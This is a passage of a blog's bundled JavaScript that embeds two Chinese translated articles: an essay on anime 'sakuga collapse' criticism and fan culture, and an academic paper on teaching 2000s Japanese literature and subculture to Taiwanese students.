度的轉變，原本認為是理所當然看著的播映作品，實際上並非如此。並且對於「只」關注臉部有沒有問題的動畫觀眾也開始有了不信任感。</p>\n<p>到底是誰的錯呢，是海外動畫公司的錯，還是發包給他們的工作室的錯，或是不得不照著走的行程的錯，還是全部都有錯呢。但放長遠來看，有錯的或許是身為觀眾的我們。</p>\n<p>例如即使沒有崩壞的情況，為了避免那些會把表情的表現馬上貶為「作畫崩壞」而四處大鬧的人們，也會在作業現場過度要求統一性，最後慢性地導致製作行程的惡化。</p>\n<p>還有即使是在工作室內經過多人檢查的畫，在更上一層的客戶層得到「作畫崩壞認定」之後，而必須再進行修正的狀況。這都是為了避免在網路上造成不必要的炎上。即使這很顯然是不對勁的。</p>\n<p>現在只要角色設定時的線條或陰影比較少就會單方面地被認為「偷懶」、「作畫崩壞」，導致被強迫要有大量過剩的線條。以及惡劣的製作行程和貧窮讓業界更加困窘。</p>\n<p>回過頭來，可以說這份責任是在過度要求的我們觀眾的身上吧。因此我認為，只要改革觀眾的意識，或許能讓這樣的情況變得比較柔和。</p>\n<p>即使線條不多簡單的畫，帶有魅力就是好的作品，擁有豐富的表情與個性也很好。重要的是我們要擁有像這樣的度量。</p>\n<p>培育人材和薪水問題的業界問題只能交由業界自己去解決，但我們也有能夠成為讓業界大幅改善的助力的方法。而至今仍不這樣作，我認為這是最大的欺騙。</p>\n<p>我對於「寶可夢 日與月」抱持著希望。對於在這樣的逆風中做出這種設計改革的製作人員們抱持著敬意。</p>\n<p>即使他們收到了無心的批判，我也認為這種新方向的設計得到了接納，希望不會因為這些批評讓他們受挫。</p>\n<p>▌ 請不要將作畫廚與作畫御宅混為一談\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://anond.hatelabo.jp/20130511171005\">https://anond.hatelabo.jp/20130511171005</a></p>\n<p>作畫廚和作畫御宅族是完全不一樣的。</p>\n<p>作畫御宅族指的是只要是優秀的作畫全都會愛好的人。</p>\n<p>即使是會被說是「動畫師的個性」不遵守角色設定的炫目作畫，作畫御宅族反而會因此受到其動態感和動畫師的感情顯露而感動。</p>\n<p>而為了獲得更強大的感動才收集情報、獲取知識。</p>\n<p>能夠理解うつのみや理渴求著回歸全動畫的現實主義然而在有限動畫為主流的日本裡那是極為困難的，要跨越那道牆壁尋求探索在有限裡的現實主義，然而在決定性的時間點卻被大平晉也在 Junkers Come Here(試播版)和 THE 八犬傳濱路再臨裡先超越，即使誇讚著動畫的進化與大平晉也的功績，うつのみや理卻沒能親自達成的悔恨嗎。</p>\n<p>作畫御宅族是必須要去感受它的。</p>\n<p>而在此之上出現的共通語言才是「真讓人過癮啊」。</p>\n<p>對此作畫廚是完全相反的。</p>\n<p>這指的是不管在什麼樣的情況下都「只」要求作畫的統一性，只因為些微的事情就歇斯底里的人。</p>\n<p>作畫廚就是完全沒有理解「這集是搞笑集所以要畫成很有活力的畫」或是「比往常都更嚴肅所以想要弄出比較乾燥的感覺」這種導演性的要求而馬上大喊「作畫崩壞啊！」的那些人。</p>\n<p>當然也完全沒有任何作畫知識類的東西，連動畫的制作工程也完全不理解，就只是群把無知當成盾牌我行我素造成困擾的抱怨者。</p>\n<p>而為了這樣的人動畫業界被強制採取了總作畫監督制度，由於曖昧的「品質」而被進行了強摘個性的作業，所有的動畫都被平均化，動畫師和演出家的體力與動力往下滑，業界本身正在疲乏。</p>\n<p>作畫廚的存在使得動畫的進化受阻甚至使其退化，是讓業界導向崩壞的害蟲般的存在。</p>\n<p>我仍然難以忘記河森正治監督在開始創聖的大天使 EVOL 前的訪談裡所說的「其實我並不想設置總作畫監督，但這次是無可奈何而設置了」的發言。</p>\n<p>我們真的在好幾年前就一直在說要做出作畫御宅族和作畫廚的區別了，卻仍未能被人理解而讓我相當難過。</p>\n<p>▌ 遲來的作畫崩壞討論\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://anond.hatelabo.jp/20121024033452\">https://anond.hatelabo.jp/20121024033452</a></p>\n<p>曾經有過在發表了角色設計、關鍵原畫後打了抗議電話到 JC 去的傢伙</p>\n<p>這時是網路上的作畫愛好者風潮的全盛期，我想有不少對於他的作為感到反感的聲音</p>\n<p>就他的說法是「JC 在零之使魔時明明是尊重原畫(他把原始的原作插畫誤用為「原畫」)的公司但在龍與虎卻不肯重視原畫(雖然很囉嗦但這是誤用)，讓我失望了」，</p>\n<p>然而零之使魔原本由兎塚エイジ所畫的插圖，以及動畫版的角色設計的藤井昌宏的設定在畫風上就有相當大的差別</p>\n<p>在他的腦裡似乎深信動畫版是尊重了原本的插畫的設計。</p>\n<p>我真的嚇了一跳。還說出了「龍與虎無視了ヤス設計=在踐踏著原作」，支離破碎。</p>\n<p>居然會有用這種怪獸思考在量測著畫的好壞並且打電話過去的人在，讓我覺得非常難受。</p>\n<p>而在第 1 話播出後馬上就翻臉如翻書般說了「我小看了龍與虎，抱歉！」，這樣的舉動就像提油澆火，在留言欄裡招來了更大的批評。</p>\n<p>■ 閒聊\n之後負責龍與虎的角色設計的田中將賀，負責了同樣是畫了龍與虎原作插圖的ヤス所畫的漫畫「女子落語」的角色設計。這次則是以尊重ヤス的畫風為設定動畫化。真是因果循環啊。</p>\n","date":"2019-08-25T07:25:22.000Z","excerpt":"","printDate":"August 25, 2019","printReadingTime":"1 min read"};

var route_31 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod26
});

var Mod27 = {"title":"【譯】在教育台灣學生零零年代的日本文學時所面對的諸問題與日後展望","slug":"ACG-problems-about-taiwan-students-facing-japan-culture","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://thuir.thu.edu.tw/bitstream/310901/20835/1/14-4.pdf\">http://thuir.thu.edu.tw/bitstream/310901/20835/1/14-4.pdf</a></p>\n<hr>\n<h2 id=\"前言\">前言</h2>\n<p>本文「在教育台灣學生零零年代的日本文學時所面對的諸問題與日後展望」主要為筆者以自身在授課時的實際經驗當作素材，考察傳達零零年代的文學內容給台灣人學生時所會面對（或者說所面對到）的諸問題，以及日後日本文學教育的展望。而在進入詳細的考察之前，我想先簡單談談為何在教授日本文學的時候，會選擇零零年代產出的作品當為選文對象。</p>\n<p>目前筆者所任教的國立台中科技大學應用日語系，從其於民國九十八年（西元 2009 年）建校時首個開設的碩士學所名稱「日本市場暨商務策略研究所」就能看出，學校課程都是以經營學或經濟學這類和商業有關的科目為中心組成。這種傾向在學士課程（高專部課程，通稱五專、兩年制大學課程，通稱二技、四年制大學課程，通稱四技）上也是一樣的（順帶一提，無論是哪種課程，商業相關科目的比重都會隨著年級增加）。筆者在這樣重視商業科目的環境裡，於民國九十七、九十八年度這兩年，擔任了以五專課程的五年級生為對象的「日本小說選讀」科目講師（很可惜地本課程在九十九年度後便不再開設）。這個「日本小說選讀」是門選修課程，意思是選修本課程的學生，在前提上必然地會是對日本文學投有關心的。但從開課前的事前調查，對於選課的學生所做的問卷裡來看，他們所關心的對象（雖然有一半是屬於預測的範圍）並不是夏目漱石或芥川龍之介這種日本近代享譽盛名的作家的名作，而是集中於目前盛極一時的輕小說或 BL 小說，或是像東野圭吾這種有影像化過的娛樂小說，這種更加接近動畫和漫畫的次文化文學，而非純文學。</p>\n<p>有鑑於學生們的這種嗜好性，以及他們已經在四年級的必修科目「日本名著選讀」讀過了上述的夏目漱石、芥川龍之介或大江健三郎這類從明治到戰後的代表性作家的作品，和筆者本身的專業領域是在於村上春樹、村上龍和吉本巴娜娜這些八零年後的日本文學，筆者（包含為了吸引學生興趣的意圖）選定了主要發表於 2000 年後，並且經歷過電影化、戲劇化、動畫化這種 Media Mix 洗禮的小說做為「日本小說選讀」的授課題材，將講義的內容中心放在原作／影像化作品的比較、檢討，再進一步談論個別的作品論，嘗試於最後提出從俯瞰的觀點所掌握流通於現在日本的「文學」構圖給學生們。</p>\n<h2 id=\"1-次文化領域於零零年代的日本文化中抬頭\">1. 次文化領域於零零年代的日本文化中抬頭</h2>\n<p>但筆者所草擬的這種試圖描繪出現在日本文學（以至日本文化）整體樣貌的講課計畫，在實際開始授課前的大綱建構階段時，就遇上了巨大的問題。並不是 2000 年後發表的小說較少有影像化作品的這種單純問題。反而在這十年來所發表的輕小說或懸疑小說這類娛樂作品以及純文學作品，都有許多透過動畫化、戲劇化和電影化的形式影像化的作品，其數量更是多到不可能在一年的課程裡全部提及。因此在挑選這十年裡所發表的小說有影像化的作品時並沒有什麼困難的感覺。但當挑選作品告一段落，準備進到構成講課內容的階段時，筆者被困住了。或者該說（也無法否認這大多和筆者自身的能力不足有關）教授每堂課的單個點的作品論，可以教的內容多到能教上好幾年，但再往前一步想將這些點連結起來，試圖構成 2000 年代日本文學狀況的線狀圖時，為了將點與點之間的連結關聯性明確化，就必須要大量地提及做為輔助線於次文化領域流通的作品。</p>\n<p>當然我必須承認遇上這個問題的原因，一大部份是上述的筆者自身的能力不足所導致。但不畏誤解先提出結論的話，筆者所面對的這種文學／文化裡的問題，除去筆者個人的實力之外，和文學在現在多樣化的媒體環境裡所處位置的狀況論問題，有著相當深切的關係也是事實。</p>\n<p>想要在這種多樣化的媒體環境裡只以小說作品（尤其是純文學）做為基軸，去構成某種零零年代的想像力的線狀圖時，顯示出其困難度的一例便是於 2000 年代所抬頭的批評家宇野常寬所撰寫的《零零年代的想像力》（2008 年 7 月由早川書房出版）。如同宇野介紹的「本書著眼於零零年代——也就是從 2000 年到 2008 年的國內文化，尤其是小說、電影、漫畫、電視劇、動畫這種『故事』上，並且追循其想像力的變遷」，此書所嘗試的是抹去所有類別的界線，試圖從所謂總體文化的視點去探究「零零年代」裡的「想像力的變遷」的過程。</p>\n<p>宇野在本書中，將九零年代開始顯現的「對於自己在社會上能實現自我的信賴感低下＝『即使努力也沒有意義』的世界觀滲透」所引發的「追尋『真正的自我』或是『過去的精神創傷』——這一類承認的內在故事」這種「古老的想像力」（「繭居族／心理主義」的想像力）背後的「九零年代式的『錯的是這個社會，責任並不在我』」這種思考，轉換成「這個社會不再提供『正確的價值觀』或是『活著的意義』，已經是理所當然的＝『前提』」並姑且接納之，基於此提出「零零年代」的「想像力的變遷」背後的緣由，也就是「於二零零一年後浮現的」「現代的想像力」（「決斷主義」的想像力）是為了克服這種「前提」而出現的「理解到這一切都是究極地毫無根據後，『刻意』選擇特定的價值」。我認為有問題的地方並不是宇野所提出的，從九零年代的「古老的想像力」（「繭居族／心理主義」的想像力）走向二零零一年後的「現代的想像力」（「決斷主義」的想像力）中間的過程是否妥當，而是宇野在本書中以「碇真嗣無法阻止夜神月」這樣的譬喻來言表「九零年代的『繭居族』與零零年代的『決斷主義』的對抗」，並且不是選擇文學作品，而是各自選擇了《新世紀福音戰士》（庵野秀明監導，自 1995 年 10 月於東京電視台播映至 1996 年 3 月）和《死亡筆記本》（原作・大場つぐみ／作畫・小畑健，自 2003 年 12 月於《週刊少年 JUMP》上連載至 2006 年 5 月）這兩部動畫、漫畫作品作為了如同卡農般的象徵性作品。</p>\n<p>而要如上述所講的，以整體的「文化批評」做為目標，雖然宇野在本書中也提及了櫻井亞美和田口藍迪的作品，以及錦矢莉莎的《欠踹的背影》（於 2003 年 8 月由河出書房新社出版）、白岩玄的《野豬大改造》（2004 年 11 月由河出書房新社出版）這些文學作品，在讀完本書之後，仍然難以抹除宇野分析對象的中心仍然是如方才列舉的《新世紀福音戰士》／《死亡筆記本》這樣的動畫、漫畫作品，而文學作品僅是輔助這些作品用的參考例的感受。用比較挑釁的說法便是，《零零年代的想像力》的分析過程僅是將主軸置於次文化作品上，文學後退到了輔助線的位置。</p>\n<p>而另一為零零年代的代表性論者，對宇野也造成了莫大影響的批評家東浩紀曾說過「漫畫和動畫正在侵食文學這種論點」是「從一九八零年代就已經有人這樣說」、「這並不是什麼新的觀點」（《遊戲性寫實主義的誕生——動物化的後現代 2》，2007 年 3 月由講談社現代新書出版），但依筆者所見，上述《零零年代的想像力》所說的，一種明顯的主流文化／次文化的逆轉現象，仍然是在零零年代（亦或是九零年代）之後才開始變得顯著的。而在這種逆轉現象的背景裡，自九零年代裡不再有像八零年代活躍的村上春樹、春上龍、吉本芭娜娜、山本詠美這類擁有大量讀者的人氣作家，到東浩紀所指摘的「消費者意識與市場構造出現的巨大變化」、「亦及，會讓人願意讀小說的環境本身產生了變化」（同前書）這類帶有社會構造論視野的見解，其要因十分複雜。</p>\n<p>不論如何，我認為這種不仰賴動畫和漫畫這些次文化作品作為輔助線，就無法描繪出實時的日本文學發展的構造的狀況，在這之後只會更為嚴重。這在「日本文學教育」上的意義便是，往後想要在教育的前線試圖即時跟隨日本文學的發展，會如同東浩紀所斷言的「（在現代日本社會裡）這種文學的，亦或是故事性的想像力，已經轉往跨媒體式的發展。因此在這樣的環境裡，想要重新聚焦在小說這種形式上，也會需要明確的理由」（同前書），得要證明文學相較其它相鄰領域（次文化）作為論述世界的工具是更為優秀的。若是教授方沒有強力的科學根據，教育內容就必然得從「日本文學教育」走向「日本文化教育」，這是目前筆者的真實感受。</p>\n<h2 id=\"2-台灣人學生們究竟理解現代日本文化的本質到什麼程度？\">2. 台灣人學生們究竟理解現代日本文化的本質到什麼程度？</h2>\n<p>至此我們已經基於筆者於編寫教材大綱時的經驗，說明了在為台灣人學生教育零零年代的日本文學時面對的問題之一是，必須以動畫和漫畫這些次文化作為輔助線，才能描繪出零零年代的日本文學發展。但即使放進大量的動畫和漫畫這類的次文化，成功描繪出粗略的零零年代的日本文學發展，就筆者自身的感受而言，要在實際的講課中讓台灣人學生能順暢地理解這些發展，是比編寫教材大綱更加困難的。先講結論，為何會如此困難的原因，並不是因為台灣人學生的日文能力這種表面的要素，而是和日本／台灣兩國之間有著文化背景上的差異，這種根源性的要素有關。換句話說，在日本／台灣兩國之間的文化背景差異，正是學生們試圖理解教師所提出的日本文化構造背後的社會性脈絡時最大的障礙。而這也意味著，雖然目前眾所周知地，日本的流行文化已經成為台灣年輕人們生活的一部份（例如漫畫、動畫、日劇），並且造成了諸多的影響，但人們對於其理解很遺憾地只停留於表面上，對於諸作品背後的社會文脈是無理解的。</p>\n<p>筆者想在此舉出數個於講課中有此感的例子。例如在講授嶽本野薔薇的《下妻物語》時，這本書是以茨城縣的下妻市為舞台，描寫為了蘿莉塔服飾賭上性命的少女「桃子」，和流氓集團的女性成員「莓」之間的交流的異色青春喜劇作品，筆者在講述這兩位少女看似有著蘿莉塔與流氓這種無法相容的價值觀，並沒有互相排除，而是認同彼此的價值觀並孕育出「友情」時，試圖就此傳達給學生（雖然這樣說有些誇張）這是個以隸屬異文化的兩人之間的關係作為主題的作品。</p>\n<p>在實際的講課中，為了讓學生能接近《下妻》之中的思想主題，筆者先簡述了《下妻》的內容，並針對解讀《下妻》時十分重要的關鍵字之一的「蘿莉塔服飾」在當代的狀況，舉出了矢澤愛的《NANA》（2000 年 7 月開始於《Cookie》上連載）以及其它作品的關聯進行介紹，這時其中一位學生提出了女僕咖啡廳裡的女僕，以及 Comike 會場裡的 Cosplayer，和《下妻》的主角所執著的蘿莉塔服飾有何不同的疑問。筆者這時感受到，針對這個問題，不能只回答蘿莉塔、女僕服、Cosplay 這些日本流行文化中的服飾風格的表面狀況，還需要提及不同的著裝行為中，著衣主體和穿著服裝之間的關係性的差異。</p>\n<p>就筆者的觀點來看，目前秋葉原流行的女僕咖啡廳裡的女僕，以及 Comike 會場裡的 Cosplayer 們所穿著的制服，是做為扮演與日常的自己不同的人格（角色）用的道具穿上的。而蘿莉塔服飾，引用有名的不穩定無產者（Precariat）運動的意見領袖，雨宮處凜所說的「穿上蘿莉塔服裝，是完全不會受人歡迎的。（中略）會建立起與他人之間的阻隔」、「因為至今我們都是穿著屬於右翼的軍裝，才反過來穿上與軍裝對比的服飾，但其實軍裝和蘿莉服都是十分類似的」（榎本正樹《Herstories 她們的故事》2008 年 9 月由集英社出版），對於著衣主體來說，這是做為直接反應出自己現在的精神性，也就是為了確保同一性而披上的道具。而在《下妻》之中的蘿莉塔服飾，也是做為主角「桃子」的「洛可可」時代的精神表徵的自我同一性根據。換句話說，在女僕咖啡廳和 Comike 會場這種虛擬空間中穿著制服，和披上蘿莉塔服飾走在日常的空間裡，在著衣主體和穿著服裝背後的精神文脈的方向性可說是完全相反的。</p>\n<p>而在講授《新世紀福音戰士》和滝本竜彦的《歡迎來到 NHK！》這些，宇野所說的「『繭居族／心理主義』的想像力」為主題的作品的課程裡，也能見到學生誤以為「繭居族」和「御宅族」是相同的錯覺。似乎對他們而言，「繭居族」和「御宅族」都是過於沉迷動畫和偶像這種虛擬的對象，因而無法通常地參加這個社會，並且都有著溝通上的障礙，而成為同種類型的存在。確實就以溝通的成熟度／不成熟度而言，這兩者是類似的存在。但一路追循零零年代的日本文學狀況的著書《文學的徵兆》（2004 年 11 月由文藝春秋出版）、《文學的斷層》（2008 年 7 月由朝日出版社出版）的作者，「繭居族」專家的精神科臨床醫師，同時也是文藝批評家的齊藤環，指出了「繭居族」所抱有的問題是：「我會使用『社會性的繭居族』這個詞彙，他們並非完全足不出戶。若是如此，那就是『物理性的繭居族』了。但實際上不是如此，他們的問題是，他們過著非常長的，與所有親密的人際關係隔絕的生活。」（《文學的徵兆》），並如此定義「御宅族」：「因為日常接觸漫畫、動畫與遊戲，讓興趣限定了該人的人際關係，以及無法捨棄興趣便長大成人」（《文學的斷層》），乍看之下連日本人都容易搞混的這兩者，在嚴密觀察「人際關係」時，從「繭居族」是「過著與所有親密的人際關係隔絕的生活」，而「御宅族」是「興趣限定了該人的人際關係」而會從屬於某個親密的共同體之中，這兩者不同的意義上，便能理解兩者是似是而非的。</p>\n<p>筆者至此根據實際講課的經驗，舉出了數個台灣的年輕人對於日本的流行文化理解，仍然停留於表面層次上的例子，若要將這些觀點與「日本（現代）文學教育」的意見結合，並試圖提出某種建議，往後在文學教育的前線試圖教導實時日本文化給台灣人學生的教師們會遇到的題目是，要如何透過（不論主流文化／次文化）作品的解釋，呈現作品背後整體的各種社會文脈，讓台灣人學生們能對於日本流行文化的理解，從表面走向更深一層。</p>\n<h2 id=\"3-共享日台背景文脈的必要性\">3. 共享日台背景文脈的必要性</h2>\n<p>而要共享作品背後的文化脈絡，讓學生能有更深一層的理解，並不能只是教授日本的狀況，教師也需要對台灣特有的文化脈絡有更深一層的理解。令我強烈意識到這點，是在某次的講課裡，筆者在解說現代日本文學裡「母親」的存在是如何呈現，並舉出數部小說作品解說其特徵的時候，其中一位學生的期末報告令我十分印象深刻，裡面寫著這樣的感想：「老師在上課的時候，講了非常多作品的特徵，但我最後留下的印象是『為什麼在這些作品裡，媽媽的存在感都會比爸爸更強呢』這個問題」。</p>\n<p>戰後的日本社會，因為女性隨著核心家庭增長變為專職主婦，以及成為企業戰士的父親缺乏對於家庭的關切，造成了過度的「親密母子」現象，並有許多如江藤淳的《成熟與喪失》（1976 年 6 月由河出書房出版）、土居健郎的《「撒嬌」的構造》（1971 年 2 月由弘文堂出版）的著書將此描述為一種近親相姦式的空間，在文學的領域裡，於八零至九零年代也有許多試圖相對化這種強力的「母性」磁力的作品，例如村上龍的《寄物櫃的嬰孩》、笙野頼子的《飛黃騰達的母親》（1996 年 3 月由河出書房新社出版）、川上弘美的《踏蛇》（1996 年 9 月由文藝春秋出版）。而到了零零年代之後，仍有許多以這種「親密母子」為主題的作品（先不論作者是有自覺地在抵抗這種強力的「母性」磁力，亦或是無自覺地依賴著），從動畫《新世紀福音戰士》、Lily Franky 的自傳書《東京鐵塔：老媽和我，有時還有老爸》、到近年電影化的熱門作品，湊佳苗的《告白》（2008 年 8 月由雙葉社出版），也就是說，零零年代的日本文化是如何捕捉「母親」的存在，至今仍然是個相當實際的主題。</p>\n<p>自戰後到現代的日本文化裡，以各種樣貌出現的「親密母子」主題，對於出生於七零年代的核心家庭中的筆者而言，也是個十分感同身受的問題，並且對和筆者同樣出生於高度經濟成長期之後的許多日本人而言，（至少筆者自己認為）或多或少都有相同的感覺。但從方才引用的台灣學生的感想來看，可以推測這位學生，對於家庭關係裡的這種強力的「母性」磁力是無自覺的，因而對於筆者的指摘有深刻記憶。再實際與筆者這幾年來在台灣生活所窺見的台灣社會特質比較，可以認為這種對於「母子親密」問題意識的稀薄，不只是這位撰寫感想的學生一人獨有，而是大多台灣社會的年輕人都有這樣的傾向。目前筆者任教的台中科技大學裡（就筆者所知）也是以成長於雙薪家庭的學生佔壓倒性的多數，以及鑑於台灣的外食文化如此普及，可想見台灣家庭中母子獨處度過親密的物理時光，相較日本的核心家庭是偏少的。</p>\n<p>關於這點，雖然本文無法舉出從社會學的角度分析台灣家庭關係的專業書籍，或是整理台灣家庭的雙薪比例的統計學資料，根據目前就職於台灣企業的 OL 兼職作家的高田亞季，於雜文集「台灣風」（2003 年 5 月由 Alphapolis 出版）裡這樣寫道：</p>\n<blockquote>\n<p>日本最近越來越多人選擇把小孩交給托兒所後參與工作，台灣則有些不同。／例如我之前待的公司裡也有很多媽媽，但在 5 點後去接小孩的是少數派，大多數會在平日將小孩交給祖父母照顧，到假日才去接回家（或是和祖父母同居）。如果距離老家較遠還會有「上次和小孩見面是一個月前的事」這樣的狀況。並且他們會認為這種現象是普遍的，而不會感受到苛責。／（中略）／而我詢問身邊的年長者，「女性應該作為主婦守護家庭」這種想法似乎在戰後沒過多久就消失了。也就是日本曾經流行一時的「結婚＝永久就職」的這種想法，在台灣的這五十年來是不存在的。</p>\n</blockquote>\n<p>如果高田所說的這種生活感覺，對於大部份台灣女性而言是共通的話，台灣的家庭環境裡的母子親密度和日本家庭相較，是必然會得出更為稀薄的結論的。換句話說，在言表戰後日本社會的空間特質時經常會看到的，並且亦是現今許多日本文學主要的主題的「母性的反烏托邦」構造，是完全無法套用於台灣的。</p>\n<p>而筆者在前一章，舉了誤認「繭居族」和「御宅族」是一樣的錯覺，做為台灣的年輕人對於日本的流行文化的理解仍然停留於表面層次的例子，在《台灣風》裡也有和這點有關的文章：</p>\n<blockquote>\n<p>沒有比島國精神的日本人更不適合全球化的存在了吧。為了存活而勉強自己努力，才會如此疲憊。日本人很擅長將異文化日本化，卻無法接納異文化。所以日本出現了保存純粹的日本文化的必要，以便在痛苦的時候能夠逃進其中。／已然是演歌的世界，即使生活多麼痛苦、發生恐怖事件，日本人仍然無法捨棄日本。</p>\n<p>台灣人如果在自己身為台灣人會有所不便的時候，能夠把自己所擁有的文化（例如中國文化）塞進包裹後遠走他處。他們仰賴人＝血讓文化擴散到世界個地。／（中略）／在搭乘國際線時，台灣人會買單程票，日本人則絕對會買來回票。在世界各地出沒的這兩國人，看似相似卻活在完全不同的頻譜上。或許運氣上來說台灣人是比較不幸的，但台灣人有著能擊敗不幸、存活下來的多樣性。</p>\n</blockquote>\n<p>雖然這兩段引用文也表現出了高田對於「內向化的日本人和積極外擴的台灣人」的認識，輔以筆者於網路上所找到的，2008 年時日本人與台灣人的海外留學生總數差異：「根據教育部留學統計資料顯示，2008 年台灣出國留學人數達到了 37,800 人」、「2008 年總計到海外的大學留學的日本人有 6 萬 7 千人」，以及台灣和日本的總人口數（台灣 2300 萬人，日本 1 億 2800 萬人）來看，台灣的海外留學比例相較日本是壓倒性地高上許多。這些資料也可說高田的「內向化的日本人和積極外擴的台灣人」的認識是有一定程度的妥當性在的。但在接納這種認識的同時，對於立志向外的台灣年輕人們，是否能夠真正理解宇野所說的《新世紀福音戰士》代表的「對於自己在社會上能實現自我的信賴感低下＝『即使努力也沒有意義』的世界觀滲透」，這種以「繭居族／心理主義」的想像力為背景的諸作品在社會學上的重要性，也是必須要打上巨大的問號。</p>\n<p>或許不僅限於主流文化／次文化，在實時傳播的文化內容裡的概念、主題，與接收者的生活感受和問題意識重合時，因為裡頭通常會有能依照同時代的文脈感同身受的要素，令這些概念、主題能得到大多數人的同感，讓人認為其中存在著某種普遍性。筆者當初赴身前來台灣時，也認為如此支持日本現代流行文化的台灣年輕人，在精神構造的層面上或許和日本年輕人是一樣的。但在本文所提出的諸多例子，讓筆者理解到，熱烈支持現代日本文化的學生，其理解深度仍然僅停留於無視背後的社會文脈的表面層次上，並且在日本（的人文科學領域）裡幾乎可說是共識的概念，在台灣這「異文化」裡並不具有普遍性。而這意味著，為了能讓台灣的學生們，理解到不僅限於「零零年代」的，以及往後跨越國境流傳過來的日本文學（文化）的本質，整理其背後（包含日本／台灣的差異）的文脈是不可或缺的，更是參與文學教育的工作者的義務。</p>\n<h2 id=\"4-關於日本流行文化教育的前端（作為結論）\">4. 關於日本流行文化教育的前端（作為結論）</h2>\n<p>本文至此根據筆者的實際體驗，說明了想要體系化地教授「零零年代」這種同時代的文學（文化）特質給台灣人學生時，必然需要大量提及在除了文學作品之外的次文化領域裡流通的作品作為輔助線，同時在選用這些流行文化做為文本時，教師／學生雙方都必須努力共享在日本與台灣兩國背後各種社會文脈的異同。最後作為結論，筆者想以於台灣進行日文（以及日本文化）教育的觀點，就現在台灣的「輕小說」現況與樞紐，考察往後以日本的流行文化做於教育素材時，能夠期待獲得什麼樣的效果。</p>\n<p>中國近代文學的研究者，同時也是近現代日本文學的年輕文藝批評家的福嶋亮大，在著書《神話開始思考》（2010 年 4 月由青土社出版）裡寫到「近年來輕小說開始進入韓國、台灣與中國，並在各地出現了微妙不同的進化」、「『輕小說』在 2000 年後中國大陸和台灣開始篷勃發展，誕生許多知名的年輕作家，尤其是對於承襲了全球化消費文化和網路恩惠的『八零後世代』（指於一九八零年代後出生的世代）的作家和讀者們而言，（日本的）以『漫畫、動畫的機制』為基礎的輕小說是最容易引起共鳴的媒體，並成為於出版上進行許多嘗試的母體」，並在中文文化圈裡「輕小說」興盛的環境中，將焦點放在台灣，整理出台灣「輕小說」流通的背景與特徵。</p>\n<blockquote>\n<p>台灣因為高密度的 IT 環境，讓輕小說和網路有了強力的連結。例如台灣年輕一代的代表性網路作家九把刀曾提醒過，台灣的網路小說是源自於 BBS（留言板）上的互動，和讀者的距離極為接近，這是一個互相作用的世界。而這種作家在 BBS 上間斷地發表作品，讀者直接給予反饋的集團創作＝讀書體驗，單純化的劇本與角色會比厚重的故事更容易獲得良好的反應。／（略）／因此網路小說可說必然地，會以和年輕人之間流行的好萊屋電影和日本漫畫極為接近的理論撰寫。</p>\n</blockquote>\n<p>因為「和網路有強力的連結」、「與讀者的距離極為接近」，「單純化的劇本與角色比起厚重的故事更容易」受到喜愛的「台灣的網路小說」的世界，如同福嶋在另一篇文章「故事望見的夢——華文世界的文化資本」裡寫的，在「台灣的網路小說」的世界裡，諸作品後退成了「（網路作家為了）展現『想被看見的自己』的附屬物」。以及「網路小說」的世界裡有「數量龐大的故事相互競爭」，作家為了確保自己的作家性，必須要透過「在網路上撰寫超越常識數量的小說或雜文」來持續獲得「粉絲的承認」。所以「台灣的網路小說」才會「單純化的劇本與角色比起厚重的故事更容易」受到喜愛。</p>\n<p>挑釁點地說，台灣的「輕小說」的世界充滿了無數僅是仿製日本輕小說表層內容的贗品，是個缺乏批評性的環境。而要統整這種充滿贗品的「網路小說」的世界，創造出作家能以作品本身的強度進行勝負，而不是為了「展現『想被看見的自己』」而寫小說的土地，即使這無法傳達給所有的「網路小說」的作者，我認為在日本文化教育的前線，腳踏實地努力將日本流行文化背後的各種社會文脈，整體地教授給現在正在撰寫「網路小說」，亦或是之後準備參與撰寫的台灣年輕人，藉此鍛鍊出他們的領導力是必要的。</p>\n<p>透過日本文化教育前線統整「網路小說」的世界，並不單只是直接將日本文化的特質傳授給「網路小說」的作者。想當然爾讓所有台灣的「網路小說」的作者受日文教育是不可能的。但透過在日文教育的前線培養出優秀的日本流行文化介紹人（＝譯者），藉此影響「網路小說」的作者是可能做得到的，培養優秀的日本文化介紹者，就能間接地幫助台灣的「輕小說」世界發展。實際上獲得二零零九年六月的第一次台灣角川輕小說文化大獎「金賞」，並透過翻譯在角川書店的女性輕小說品牌「Beans 文庫」出版的《華葬傳》的作者久遠，在日本的出書會上表明自己不僅有接觸日本的輕小說，對於如乙一、小野不由美這些日本現代文學作家的作品也廣為涉略，久遠登上日本這件事，也證明了從福嶋所說的，作品僅是作家展現「『想被看見的自己』的附屬物」的「台灣網路小說」的世界裡，也會出現能寫出逆流回日本的優秀「輕小說」的作家，同時這般優秀的作家，必然地擁有相應的對於日本流行文化的教養。</p>\n<p>至此是作為結論的，主要以台灣「輕小說」的現狀考察日文教育（以及日本文化教育）裡日本流行文化教育的必要性。日本的流行文化乍看之下，或許是如宮台真司在《一九九二年之後日本次文化史中意義論的變遷》所寫的「擁有將社會文化脈落去關聯化的功能」，會讓觀看者有種去歷史與去政治的印象。而這種去歷史與去政治的印象，或許也正是日本的流行文化能廣於東亞流行的原因之一。</p>\n<p>但僅是停留在這種表面的讀解，往後在世界各地誕生的日本文化，將仍不出模仿的領域。為了能在這樣的時刻，培養出如前述的久遠這般能逆流回日本的優秀作者，以及能產出這般作者的的基礎養份，亦及優秀的日本文化介紹者，在教育的前線裡積極地導入文化研究的架構（Cultural studies 的理論），將日本文化背後的歷史性、政治性明朗化，以非流行（輕浮、灑脫）式的觀點解讀日本的流行文化，亦及「去流行化」的作業是必不可缺的。這點如比較文學家的 Jonathan Abe 也在《Cool Japanology 的可能性與不可能性》裡，看出現在流行的「Cool Japan」的「Cool」背後帶有「後現代性地否認政治與歷史」的態度，並提出日本學（即「Japanology」）的職責應是加深對於對象的理解、解讀其中的歷史性、政治性，也就是將「Cool Japan」去「Cool」化，因此在擁有眾多支持現代日本流行文化的年輕人的台灣，更該為了化解無數誤解的產生，以及為了培養輩出擔起次世代流行文化的優秀創作者，將日本與台灣彼此之間的文脈異同明朗化後進行文脈解讀。筆者認為這種「去流行化」的姿勢在往後會變得更加重要。</p>\n<p>（Minami Yuta 國立台中科技大學應用日文系）</p>\n","date":"2020-10-06T22:17:41.000Z","excerpt":"","printDate":"October 6, 2020","printReadingTime":"1 min read"};

